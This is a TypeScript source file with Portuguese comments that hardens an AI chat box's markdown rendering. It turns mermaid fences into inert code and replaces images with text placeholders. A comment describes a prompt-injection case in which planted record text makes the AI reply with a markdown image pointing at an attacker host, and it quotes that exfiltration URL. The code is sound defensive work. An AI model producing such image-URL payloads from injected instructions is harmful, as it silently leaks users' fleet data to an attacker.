// A saída do assistente é conteúdo NÃO-confiável. O Streamdown renderiza fences
// `mermaid` num componente que injeta SVG via dangerouslySetInnerHTML (cadeia
// mermaid→DOMPurify, com advisories). A IA de frota não precisa de diagramas.
//
// Correção ESTRUTURAL (não regex por linha, que não cobre blockquote/listas): um
// remark plugin que opera no AST (mdast) e reescreve a linguagem de QUALQUER nó
// `code` mermaid para "text", ANTES da renderização. Por ser no AST, cobre todos
// os containers (raiz, blockquote, lista, aninhados) sem sanitização caseira nem
// patch em node_modules. O Streamdown então mostra um bloco de código INERTE
// (nunca o componente Mermaid). Markdown, tabelas, links e código comum seguem.

import { createElement } from "react";

// IMAGEM na resposta da IA NUNCA é carregada. O navegador buscaria a URL
// SOZINHO (sem clique): um texto malicioso cadastrado num registro (prompt
// injection) faria a IA responder ![](https://atacante/?d=<dados da frota>) e o
// dono vazaria os dados só de abrir a resposta. Vira texto inerte "[imagem]".
// Links (<a>) seguem — exigem clique e já passam pelo safeAiUrl.
function ImagemInerte(props: { alt?: string }) {
  const alt = (props.alt ?? "").trim();
  return createElement(
    "span",
    { className: "text-muted-foreground" },
    alt ? `[imagem: ${alt}]` : "[imagem]"
  );
}

// Passado em `components` do Streamdown/react-markdown (AIChatBox e testes).
export const AI_MARKDOWN_COMPONENTS = { img: ImagemInerte };

// Nó mínimo do mdast que precisamos (evita depender de @types/mdast /
// unist-util-visit). Só lemos type/lang e descemos por children.
interface MdastNodeLike {
  type: string;
  lang?: string | null;
  children?: MdastNodeLike[];
}

export function remarkNeutralizeMermaid() {
  return (tree: MdastNodeLike): void => {
    const walk = (node: MdastNodeLike): void => {
      if (
        node.type === "code" &&
        typeof node.lang === "string" &&
        node.lang.trim().toLowerCase() === "mermaid"
      ) {
        node.lang = "text";
      }
      if (node.children) {
        for (const child of node.children) walk(child);
      }
    };
    walk(tree);
  };
}
